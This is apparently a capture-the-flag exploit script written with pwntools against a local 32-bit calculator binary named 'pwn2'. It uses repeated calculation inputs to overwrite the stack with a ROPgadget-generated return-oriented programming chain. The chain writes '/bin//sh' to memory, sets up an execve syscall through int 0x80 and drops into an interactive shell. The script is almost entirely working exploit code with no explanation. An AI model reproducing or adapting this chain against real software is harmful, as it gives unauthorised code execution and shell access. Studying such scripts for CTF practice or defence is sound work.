#!/usr/bin/python 
from pwn import *
from struct import pack
# context.log_level = 'debug'
p = process('pwn2')

times = 18+33
p.recvuntil('How many times do you want to calculate:')
p.sendline(str(times))

def calc(optr = None, num1 = None, num2 = None):
    p.recvuntil('result\n')
    p.sendline(str(optr))
    p.sendline(str(num1))
    p.sendline(str(num2))

for i in range(16): calc(2,1,1)

rop = (	# generated by ROPgadgets
	0x0806ed0a, # pop edx ; ret
	0x080ea060, # @ .data
	0x080bb406, # pop eax ; ret
	u32('/bin'),
	0x080a1dad, # mov dword ptr [edx], eax ; ret
	0x0806ed0a, # pop edx ; ret
	0x080ea064, # @ .data + 4
	0x080bb406, # pop eax ; ret
	u32('//sh'),
	0x080a1dad, # mov dword ptr [edx], eax ; ret
	0x0806ed0a, # pop edx ; ret
	0x080ea068, # @ .data + 8
	0x08054730, # xor eax, eax ; ret
	0x080a1dad, # mov dword ptr [edx], eax ; ret
	0x080481c9, # pop ebx ; ret
	0x080ea060, # @ .data
	0x0806ed31, # pop ecx ; pop ebx ; ret
	0x080ea068, # @ .data + 8
	0x080ea060, # padding without overwrite ebx
	0x0806ed0a, # pop edx ; ret
	0x080ea068, # @ .data + 8
    	0x08054730, # xor eax, eax ; ret
	0x0807b75f, # inc eax ; ret
    	0x0807b75f, # inc eax ; ret
	0x0807b75f, # inc eax ; ret
    	0x0807b75f, # inc eax ; ret
	0x0807b75f, # inc eax ; ret
    	0x0807b75f, # inc eax ; ret
	0x0807b75f, # inc eax ; ret
    	0x0807b75f, # inc eax ; ret
	0x0807b75f, # inc eax ; ret
    	0x0807b75f, # inc eax ; ret
	0x0807b75f, # inc eax ; ret
    	0x08049781, # int 0x80
)
for i in rop: calc(3,1,i)

p.recvuntil('result\n')
# gdb.attach(p, "b *0x08048f9d") # break at memcpy
p.sendline("5")

p.interactive()
